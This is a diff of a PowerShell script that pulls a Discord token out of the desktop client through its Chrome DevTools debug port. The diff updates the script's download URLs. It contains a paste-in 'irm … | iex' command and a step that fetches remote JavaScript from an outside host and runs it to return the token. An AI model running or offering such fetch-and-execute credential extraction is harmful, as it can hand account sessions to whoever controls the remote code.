@@ -1,10 +1,10 @@
 # Read your Discord token via the desktop client's Chrome DevTools Protocol.
-#   irm https://script.riyo.me/d/token | iex
+#   irm https://script.riyo.me/d/p/token | iex
 # Self-contained per script; factor the shared CDP block into a helper if these multiply.
 $ErrorActionPreference = "Stop"
 $port = 9222
 Write-Host "Fetching token reader..." -ForegroundColor Cyan
-$code = Invoke-RestMethod "https://script.riyo.me/d/token.js"   # expression ends in ",w.t" so evaluate returns the token
+$code = Invoke-RestMethod "https://script.riyo.me/d/c/token"   # expression ends in ",w.t" so evaluate returns the token
 
 # Ensure the desktop client is running with the debug port open.
 function Test-Port { try { Invoke-RestMethod "http://127.0.0.1:$port/json/version" -TimeoutSec 2 | Out-Null; $true } catch { $false } }
